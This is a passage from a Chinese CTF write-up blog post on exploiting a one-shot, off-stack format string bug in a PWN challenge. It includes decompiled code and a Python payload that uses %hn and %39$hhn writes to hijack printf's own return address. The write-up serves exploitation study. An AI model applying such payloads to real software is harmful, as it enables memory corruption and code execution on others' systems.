<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-bounce.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"zikh26.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.17.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"default"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"æœç´¢...","empty":"æ²¡æœ‰æ‰¾åˆ°ä»»ä½•æœç´¢ç»“æœï¼š${query}","hits_time":"æ‰¾åˆ° ${hits} ä¸ªæœç´¢ç»“æœï¼ˆç”¨æ—¶ ${time} æ¯«ç§’ï¼‰","hits":"æ‰¾åˆ° ${hits} ä¸ªæœç´¢ç»“æœ"},"path":"/search.xml","localsearch":{"enable":"ture","trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>

    <meta name="description" content="å‰è¨€è¿™æ˜¯ä¸€é“æ¥è‡ªäº ç¬¬å…­å±Šå¼ºç½‘æ‹Ÿæ€çº¿ä¸‹èµ› æœ‰è¶£çš„ PWN é¢˜ï¼Œè€ƒå¯Ÿçš„æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚æˆ‘è‡ªè®¤ä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„é¢˜ç›®å·²ç»å¾ˆç†Ÿç»ƒäº†ï¼Œå¯åœ¨æˆ‘çš„å°è±¡ä¸­æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ— æ³•ä¸€æ¬¡å‘ä¸€ä¸ªä¸å­˜åœ¨çš„æŒ‡é’ˆä¸­å†™å…¥æ•°æ®ï¼Œè¿™é“é¢˜é¢ è¦†äº†æˆ‘çš„è®¤çŸ¥ğŸ¥²ã€‚ä¿æŠ¤å…¨å¼€ï¼Œåªæœ‰ä¸€æ¬¡ éæ ˆä¸Š æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åˆ©ç”¨çš„æœºä¼šï¼Œä¹‹åè§¦å‘ _exit å‡½æ•°é€€å‡ºï¼Œå”¯ä¸€çš„ä¿¡æ¯æ˜¯æœ‰æ ˆåœ°å€æœ«å°¾çš„ä¸¤ä¸ªå­—èŠ‚ã€‚è¿™å¯èƒ½æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²èƒ½åˆ©ç”¨çš„æé™æ¡ä»¶ï¼Ÿï¼ğŸ˜¶â€ğŸŒ«ï¸">
<meta property="og:type" content="article">
<meta property="og:title" content="ä¸€æ¬¡æœ‰è¶£çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åˆ©ç”¨">
<meta property="og:url" content="https://zikh26.github.io/posts/a523e26a.html">
<meta property="og:site_name" content="ZIKH26&#39;s Blog">
<meta property="og:description" content="å‰è¨€è¿™æ˜¯ä¸€é“æ¥è‡ªäº ç¬¬å…­å±Šå¼ºç½‘æ‹Ÿæ€çº¿ä¸‹èµ› æœ‰è¶£çš„ PWN é¢˜ï¼Œè€ƒå¯Ÿçš„æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚æˆ‘è‡ªè®¤ä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„é¢˜ç›®å·²ç»å¾ˆç†Ÿç»ƒäº†ï¼Œå¯åœ¨æˆ‘çš„å°è±¡ä¸­æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ— æ³•ä¸€æ¬¡å‘ä¸€ä¸ªä¸å­˜åœ¨çš„æŒ‡é’ˆä¸­å†™å…¥æ•°æ®ï¼Œè¿™é“é¢˜é¢ è¦†äº†æˆ‘çš„è®¤çŸ¥ğŸ¥²ã€‚ä¿æŠ¤å…¨å¼€ï¼Œåªæœ‰ä¸€æ¬¡ éæ ˆä¸Š æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åˆ©ç”¨çš„æœºä¼šï¼Œä¹‹åè§¦å‘ _exit å‡½æ•°é€€å‡ºï¼Œå”¯ä¸€çš„ä¿¡æ¯æ˜¯æœ‰æ ˆåœ°å€æœ«å°¾çš„ä¸¤ä¸ªå­—èŠ‚ã€‚è¿™å¯èƒ½æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²èƒ½åˆ©ç”¨çš„æé™æ¡ä»¶ï¼Ÿï¼ğŸ˜¶â€ğŸŒ«ï¸">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202312102141249.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202312111504183.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202312111505355.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202312111532028.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202312111544487.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202312111551025.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202312111640224.png">
<meta property="og:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202312111644018.png">
<meta property="article:published_time" content="2023-12-11T09:07:10.472Z">
<meta property="article:modified_time" content="2024-02-06T03:05:14.649Z">
<meta property="article:author" content="ZIKH26">
<meta property="article:tag" content="æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202312102141249.png">


<link rel="canonical" href="https://zikh26.github.io/posts/a523e26a.html">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://zikh26.github.io/posts/a523e26a.html","path":"posts/a523e26a.html","title":"ä¸€æ¬¡æœ‰è¶£çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åˆ©ç”¨"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>ä¸€æ¬¡æœ‰è¶£çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åˆ©ç”¨ | ZIKH26's Blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="åˆ‡æ¢å¯¼èˆªæ " role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">ZIKH26's Blog</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="æœç´¢" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>é¦–é¡µ</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>å…³äº</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>æ ‡ç­¾</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>åˆ†ç±»</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>å½’æ¡£</a></li><li class="menu-item menu-item-å‹é“¾"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>å‹é“¾</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>æœç´¢
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="æœç´¢..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          æ–‡ç« ç›®å½•
        </li>
        <li class="sidebar-nav-overview">
          ç«™ç‚¹æ¦‚è§ˆ
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">å‰è¨€</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4"><span class="nav-number">2.</span> <span class="nav-text">ç¨‹åºä¿æŠ¤</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"><span class="nav-number">3.</span> <span class="nav-text">ç¨‹åºåˆ†æ</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E6%AC%A1%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8E%BB%E7%BC%96%E8%BE%91%E4%B8%80%E4%B8%AA%E4%B8%8D%E5%AD%98%E5%9C%A8%E7%9A%84%E6%8C%87%E9%92%88"><span class="nav-number">4.</span> <span class="nav-text">ä¸€æ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²å»ç¼–è¾‘ä¸€ä¸ªä¸å­˜åœ¨çš„æŒ‡é’ˆ</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%8E%E7%BB%AD%E5%88%A9%E7%94%A8"><span class="nav-number">5.</span> <span class="nav-text">åç»­åˆ©ç”¨</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EXP"><span class="nav-number">6.</span> <span class="nav-text">EXP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%BE%E5%A3%B0"><span class="nav-number">7.</span> <span class="nav-text">å°¾å£°</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="ZIKH26"
      src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011626843.jpg">
  <p class="site-author-name" itemprop="name">ZIKH26</p>
  <div class="site-description" itemprop="description">ä¸‡å¤å‡¡é—´ä¸€è¿‡å®¢ï¼Œä¹å¤©ä¹‹ä¸Šç¬¬ä¸€ä»™</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">113</span>
          <span class="site-state-item-name">æ—¥å¿—</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">17</span>
        <span class="site-state-item-name">åˆ†ç±»</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">113</span>
        <span class="site-state-item-name">æ ‡ç­¾</span></a>
      </div>
  </nav>
</div>

        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="è¿”å›é¡¶éƒ¨">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/a523e26a.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011626843.jpg">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="ä¸‡å¤å‡¡é—´ä¸€è¿‡å®¢ï¼Œä¹å¤©ä¹‹ä¸Šç¬¬ä¸€ä»™">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="ä¸€æ¬¡æœ‰è¶£çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åˆ©ç”¨ | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          ä¸€æ¬¡æœ‰è¶£çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åˆ©ç”¨
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">å‘è¡¨äº</span>

      <time title="åˆ›å»ºæ—¶é—´ï¼š2023-12-11 17:07:10" itemprop="dateCreated datePublished" datetime="2023-12-11T17:07:10+08:00">2023-12-11</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">æ›´æ–°äº</span>
      <time title="ä¿®æ”¹æ—¶é—´ï¼š2024-02-06 11:05:14" itemprop="dateModified" datetime="2024-02-06T11:05:14+08:00">2024-02-06</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">åˆ†ç±»äº</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%B5%9B%E9%A2%98WP/" itemprop="url" rel="index"><span itemprop="name">èµ›é¢˜WP</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¿™æ˜¯ä¸€é“æ¥è‡ªäº <strong>ç¬¬å…­å±Šå¼ºç½‘æ‹Ÿæ€çº¿ä¸‹èµ›</strong> æœ‰è¶£çš„ <code>PWN</code> é¢˜ï¼Œè€ƒå¯Ÿçš„æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚æˆ‘è‡ªè®¤ä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„é¢˜ç›®å·²ç»å¾ˆç†Ÿç»ƒäº†ï¼Œå¯åœ¨æˆ‘çš„å°è±¡ä¸­æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ— æ³•ä¸€æ¬¡å‘ä¸€ä¸ªä¸å­˜åœ¨çš„æŒ‡é’ˆä¸­å†™å…¥æ•°æ®ï¼Œè¿™é“é¢˜é¢ è¦†äº†æˆ‘çš„è®¤çŸ¥ğŸ¥²ã€‚ä¿æŠ¤å…¨å¼€ï¼Œåªæœ‰ä¸€æ¬¡ <strong>éæ ˆä¸Š</strong> æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åˆ©ç”¨çš„æœºä¼šï¼Œä¹‹åè§¦å‘ <code>_exit</code> å‡½æ•°é€€å‡ºï¼Œå”¯ä¸€çš„ä¿¡æ¯æ˜¯æœ‰æ ˆåœ°å€æœ«å°¾çš„ä¸¤ä¸ªå­—èŠ‚ã€‚è¿™å¯èƒ½æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²èƒ½åˆ©ç”¨çš„æé™æ¡ä»¶ï¼Ÿï¼ğŸ˜¶â€ğŸŒ«ï¸</p>
<span id="more"></span>

<p>é¢˜ç›®é“¾æ¥ï¼š<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1ouBtIRpfLBhzPQyi5116JA?pwd=y6sy">https://pan.baidu.com/s/1ouBtIRpfLBhzPQyi5116JA?pwd=y6sy</a><br>    æå–ç ï¼šy6sy</p>
<h2 id="ç¨‹åºä¿æŠ¤"><a href="#ç¨‹åºä¿æŠ¤" class="headerlink" title="ç¨‹åºä¿æŠ¤"></a>ç¨‹åºä¿æŠ¤</h2><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202312102141249.png" alt="image-20231210214133468"></p>
<p>è¿™ä¸ª <code>canary</code> æ˜¯å­˜åœ¨çš„ï¼ˆé€šè¿‡åˆ†æ <code>main</code> å‡½æ•°çš„èµ·å§‹æ±‡ç¼–ä»£ç æˆ–è€… <code>gdb</code> è°ƒè¯•éƒ½èƒ½åˆ¤æ–­å‡ºæ¥ï¼‰ï¼Œä½†å› ä¸º <code>_exit</code> ç›´æ¥ä» <code>main</code> å‡½æ•°é€€å‡ºçš„å¹²æ‰°ï¼Œä¼¼ä¹ <code>checksec</code> å¹¶æ²¡æœ‰æ£€æµ‹åˆ°è¿™ä¸ªä¿æŠ¤</p>
<h2 id="ç¨‹åºåˆ†æ"><a href="#ç¨‹åºåˆ†æ" class="headerlink" title="ç¨‹åºåˆ†æ"></a>ç¨‹åºåˆ†æ</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 savedregs; <span class="comment">// [rsp+10h] [rbp+0h] BYREF</span></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Gift: %x\n&quot;</span>, (<span class="type">unsigned</span> __int16)((<span class="type">unsigned</span> __int16)&amp;savedregs - <span class="number">12</span>));</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  _exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç¨‹åºæ³„éœ²äº†ä¸€ä¸ªæ ˆåœ°å€çš„æœ«å°¾ä¸¤ä¸ªå­—èŠ‚ï¼Œéšåæ˜¯ä¸€ä¸ªéæ ˆä¸Šçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œ<code>printf</code> å‡½æ•°æ‰§è¡Œå®Œè§¦å‘ <code>_exit</code> å‡½æ•°ï¼ˆè¯¥å‡½æ•°åªæ‰§è¡Œé€€å‡ºåŠŸèƒ½ï¼Œä¸ä¼šæ¸…ç† <code>IO</code> æµï¼Œè¿™æ„å‘³ç€æ— æ³•åŠ«æŒ <code>exit</code> å‡½æ•°é‚£æ ·çš„å†…éƒ¨å‡½æ•°æŒ‡é’ˆï¼‰</p>
<p>åœ¨çº¿ä¸‹æ¯”èµ›çš„æ—¶å€™ï¼Œæˆ‘åˆ†æå‡ºåº”è¯¥æ˜¯è¦ç”¨ <code>printf</code> å‡½æ•°æ¥åŠ«æŒå®ƒè‡ªå·±çš„è¿”å›åœ°å€ï¼Œé™¤æ­¤ä¹‹å¤–æ²¡æœ‰ä»»ä½•ä¸€ä¸ªåŠ«æŒæŒ‡é’ˆçš„æœºä¼šäº†ï¼ˆå¯ä»¥æœä¸€ä¸‹ <strong>2023å¹´é‡‘ç›¾æ¯çº¿ä¸Šèµ›</strong> ï¼Œè¿™ä¸ªæ¯”èµ›çš„ä¸€ä¸ª <strong>PWN</strong> é¢˜å’Œæœ¬é¢˜æœ‰ä¸€äº›åƒï¼Œä¹Ÿæ˜¯ä¸€æ¬¡éæ ˆä¸Šçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„æœºä¼šç„¶å <code>exit</code> ï¼Œä½†é‚£ä¸ªæ˜¯èµ°çš„ <code>libc</code> æ­£å¸¸çš„ <code>exit</code> å‡½æ•°ï¼Œé‡Œé¢æœ‰ä½äºæ ˆé‡Œçš„ <code>ld</code> æŒ‡é’ˆå¯ä»¥åŠ«æŒ  ï¼‰ã€‚<code>printf</code> å‡½æ•°åŠ«æŒè‡ªèº«è¿”å›åœ°å€çš„ä¸€ä¸ªæ¡ä»¶å°±æ˜¯å·²çŸ¥æ ˆåœ°å€ï¼Œå¦‚æœå†ç”¨ä¸€ä¸ªæ ˆé‡Œçš„æ®‹ç•™æ ˆåœ°å€æ¥æ‰“çš„è¯ï¼Œå·²çŸ¥æœ€åä¸¤ä¸ªå­—èŠ‚ä¹Ÿå¤Ÿäº†ã€‚</p>
<p>å¯åœ¨æˆ‘åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„å°è±¡ä¸­ï¼Œæ˜¯æ— æ³•å‘ä¸€ä¸ªä¸å­˜åœ¨çš„æŒ‡é’ˆä¸­å†™å…¥æ•°æ®çš„ã€‚</p>
<p>å‡è®¾ç°åœ¨æœ‰æ ˆæŒ‡é’ˆ <code>A=&gt;B=&gt;C=&gt;D</code> ï¼Œæˆ‘å¯ä»¥ç”¨æ ¼å¼åŒ–å­—ç¬¦é€šè¿‡ <code>B</code> ä¸ºè·³æ¿ä¿®æ”¹ <code>C</code> ä¸º <code>E</code>ï¼Œé‚£ä¹ˆä¿®æ”¹åçš„é“¾ä¸º <code>A=&gt;B=&gt;E=&gt;F</code>ï¼Œå¦‚æœæœ‰ç¬¬äºŒæ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„è¯ï¼Œæˆ‘å¯ä»¥æ‰¾åˆ°é“¾ <code>B=&gt;E=&gt;F</code> é€šè¿‡ <code>E</code> ä¸ºè·³æ¿ï¼Œä¿®æ”¹åŸæœ¬çš„ <code>F</code> ä¸º <code>G</code>ã€‚ä½†è¿™ä¸ªæ“ä½œæ— æ³•ç”¨ä¸€æ¬¡çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å®Œæˆï¼Œå¯èƒ½å› ä¸º <code>B=&gt;E=&gt;F</code> è¿™æ¡é“¾æœ¬èº«æ˜¯ä¸å­˜åœ¨çš„ï¼Œå³ä½¿ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åšå‡ºäº† <code>B=&gt;E=&gt;F</code> è¿™æ¡é“¾ä¹Ÿæ— æ³•åŒæ—¶å†å»æ”¹è¿™æ¡é“¾ä¸Šçš„æŒ‡é’ˆğŸ˜…</p>
<h2 id="ä¸€æ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²å»ç¼–è¾‘ä¸€ä¸ªä¸å­˜åœ¨çš„æŒ‡é’ˆ"><a href="#ä¸€æ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²å»ç¼–è¾‘ä¸€ä¸ªä¸å­˜åœ¨çš„æŒ‡é’ˆ" class="headerlink" title="ä¸€æ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²å»ç¼–è¾‘ä¸€ä¸ªä¸å­˜åœ¨çš„æŒ‡é’ˆ"></a>ä¸€æ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²å»ç¼–è¾‘ä¸€ä¸ªä¸å­˜åœ¨çš„æŒ‡é’ˆ</h2><p>èµ›åçœ‹åˆ°å…¶ä»–å¸ˆå‚…çš„ <code>payload</code> ï¼Œæˆ‘å†™äº†ä¸€ä¸ªç±»ä¼¼çš„</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;%p&#x27;</span>*<span class="number">9</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((value-<span class="number">0xc</span>)-<span class="number">90</span>).encode()+<span class="string">b&#x27;c%hn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x100023</span>-((value-<span class="number">0xc</span>))).encode()+<span class="string">b&#x27;c%39$hhn&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ª <code>payload</code> å¯ä»¥æ³„éœ²å‡ºå„ç§åœ°å€ï¼Œå¹¶ä¸”ä¸€æ¬¡å°±èƒ½åŠ«æŒæ‰ <code>printf</code> å‡½æ•°è‡ªèº«çš„è¿”å›åœ°å€</p>
<p><code>payload</code> èµ·å§‹çš„ <code>9</code> ä¸ª <code>%p</code> å¥½ç†è§£ï¼Œåé¢ <code>%xxxc%hn</code> ï¼Œè¿™ä¸ªè¯­æ³•ç¼ºäº† <code>$</code> å­—ç¬¦ã€‚<code>$</code> ä»£è¡¨å¯ä»¥æŒ‡å®šå‚æ•°ï¼Œå‡å¦‚ <code>9$</code> é‚£ä¹ˆè¡¨ç¤ºå‚æ•°åˆ—è¡¨ä¸­ç¬¬ä¹ä¸ªå‚æ•°ã€‚é€šå¸¸ç”¨è¿™ä¸€ä¸ªç‰¹æ€§å»è¿›è¡Œæ ˆä¸­ä»»æ„æŒ‡é’ˆåœ°å€å†™ï¼Œä½†å¦‚æœä¸åŠ  <code>$</code> ï¼Œå†™å…¥æ•°æ®çš„å‚æ•°ä½ç½®å°±æ˜¯æŒ‰é¡ºåºæ¥çš„ï¼Œå› ä¸º <code>printf</code> è§£æå‚æ•°ä¼šæ ¹æ® <code>%</code> è¿›è¡Œåˆ¤æ–­ï¼Œåœ¨ <code>hn</code> å‰é¢ä¸€å…±æœ‰ <code>11</code> ä¸ª <code>%</code> ï¼Œæ‰€ä»¥è¿™ä¸ª <code>%xxxc%hn</code> ä¼šå°† <code>xxx</code> æ•°æ®åŠ ä¸Š <code>%p</code> æ³„éœ²çš„å­—ç¬¦ä¸ªæ•°å†™å…¥ç¬¬åä¸€ä¸ªå‚æ•°ï¼ˆ<code>printf</code> å‡½æ•°åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡å»çš„åº”è¯¥æ˜¯åäº”ä¸ªå¯„å­˜å™¨ï¼Œ<code>rdi</code> æœ¬èº«æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²åœ°å€ï¼Œ<code>%</code> å ä½ç¬¦è§£æçš„æ˜¯ä» <code>rsi</code> å¼€å§‹çš„ï¼Œäº”ä¸ªå¯„å­˜å™¨åŠ ä¸Šå…­ä¸ªæ ˆå†…å­˜å•å…ƒï¼‰</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202312111504183.png" alt="image-20231211150425693" style="zoom:50%;" />



